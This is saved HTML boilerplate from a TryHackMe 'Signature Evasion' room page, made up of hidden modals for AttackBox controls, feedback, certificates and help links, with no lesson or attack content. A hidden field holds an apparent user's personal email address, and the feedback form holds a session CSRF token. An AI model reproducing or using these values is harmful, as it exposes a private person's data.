<div id="room-attackbox" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="attackbox-machine-instance" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="room-attackbox-loading" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
<div id="room-attackbox-vm-view" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
<div id="attackbox-machine-options" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="d-flex hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer hidden-originally" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-plus hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer hidden-originally" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-power-off hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer hidden-originally" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-minus hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded hidden-originally" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-info hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="d-flex hidden-originally" id="room-attackbox-tabs" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
</div>
<div class="modal fade hidden-originally" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-light-gray hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Web-Based Machine Information</h5>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Public IP: <code id="browser-machine-pubip" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Private IP: <code id="browser-machine-privip" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code> <span class="size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(Use this for your reverse shells)</span></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Username: <code id="browser-username" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Password: <code id="browser-password" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Protocol: <code id="browser-protocol" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
</ul>
<hr class="hr-min hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="text-lgray mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">To copy to and from the browser-based machine, highlight the text and press <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">CTRL+SHIFT+C</b> <details data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><summary data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">or use the clipboard</summary><img src="./TryHackMe _ Signature Evasion_files/clipboard.gif" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></details></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close size-30 text-lgray hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
<div id="award-modal-badges" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
<p class="mb-0 text-lgray size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fal fa-lightbulb-on hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Question Hint</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">...</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Signature Evasion_files/modal.css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<div class="modal-design-green modal fade hidden-originally" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" id="roomCompletedModalContent" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close hidden-originally" id="closeRoomComplete" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fad fa-times-circle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</button>
<div class="icon-box hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fad fa-badge-check hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<h3 class="text-accent mt-5 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Congratulations</h3>
<p class="faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></h2>
<div id="ticket-info" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div> 
<p class="faded mt-1 hidden-originally" id="roomFeedbackBtn" data-pf_style_display="none" data-pf_style_visibility="hidden">
<small data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<button class="bg-white border-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="hidden" name="_csrf" value="gOYFwUPz-iq0yYuNxK_Jai3N8dIOciymqEmg" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="roomCode" value="signatureevasion" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="type" value="rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="redirect" value="json" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="like" data-pf_style_display="none" data-pf_style_visibility="hidden">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="dislike" data-pf_style_display="none" data-pf_style_visibility="hidden">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="details" data-pf_style_display="none" data-pf_style_visibility="hidden">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control hidden-originally" style="padding: 5px;" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Send Feedback</button>
</form>
<p class="mt-2 mb-0 hidden-originally" id="formMessage" data-pf_style_display="none" data-pf_style_visibility="hidden"></p>
</div>
</div>
</div>
<script data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Signature Evasion_files/roomFeedback.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div class="modal fade hidden-originally" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">To access this machine, you need to either</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-5 pr-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use a VPN</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><button type="button" class="btn btn-light hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
or
</div>
<div class="col-sm-5 pl-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use the AttackBox</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Use a web-based attack machine <span class="size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-sm hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h1 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i class="text-warning fad fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></h1>
<h3 class="text-warning hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Expiring Soon</h3>
<p class="faded mt-3 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-sm hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h1 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i class="text-danger fad fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></h1>
<h3 class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Expired Machine</h3>
<p class="faded mt-3 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-lg hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue text-center p-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 class="mb-0 m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">How to access machines</h4>
<button type="button" class="close modal-close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Signature Evasion_files/connect_openvpn_short.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<p class="mt-2 mb-0 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Signature Evasion_files/connect_kali_short.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<p class="mt-2 mb-0 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" id="roomAlertModalTitle" data-pf_style_display="none" data-pf_style_visibility="hidden"></h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body hidden-originally" id="roomAlertModalBody" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="resetUserProgressModal" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Reset Your Progress</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><span class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-danger hidden-originally" onclick="resetProgress()" data-pf_style_display="none" data-pf_style_visibility="hidden">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-lg hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Cloud Information</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="nav nav-tabs hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="nav-item pr-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link active hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#env-tab" data-pf_style_display="none" data-pf_style_visibility="hidden">Environment</a>
</li>
<li class="nav-item hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a class="nav-link hidden-originally" data-toggle="tab" href="https://tryhackme.com/room/signatureevasion#creds-tab" data-pf_style_display="none" data-pf_style_visibility="hidden">Credentials</a>
</li>
</ul>
<div class="tab-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="tab-pane active hidden-originally" id="env-tab" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="tab-pane hidden-originally" id="creds-tab" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
<div class="modal-footer hidden-originally" id="cloudEnvModalFooter" data-pf_style_display="none" data-pf_style_visibility="hidden">
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="setNameModal" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-lg modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Generating Your Certificate</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Ã—</span>
</button>
</div>
<div class="modal-body container hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Hey there, what's your name?</h5>
<p class="text-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value="">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
</div>
</div>
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You're here incognito? It's ok!</h5>
<p class="text-secondary hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-success float-right hidden-originally" id="modal-cert-generate" onclick="gen_cert(true)" disabled="" data-pf_style_display="none" data-pf_style_visibility="hidden">
Generate with my full name
</button>
</div>
<div class="col-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-primary float-right hidden-originally" id="modal-cert-skip" onclick="gen_cert(false)" data-pf_style_display="none" data-pf_style_visibility="hidden">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Signature Evasion_files/certificateName.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div class="modal fade slideout-faq hidden-originally" id="roomSlideoutUnstuck" tabindex="-1" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-slideout hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div id="slideout-links" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="unstuck-video" class="unstuck-group hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-play hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group hidden-originally" style="display: none;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-pen-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group hidden-originally" href="https://tryhackme.com/forum/thread/630e30d2549c1400603835fe" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-comments-alt hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-books hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="unstuck-icon hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-users hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="unstuck-icon-text hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
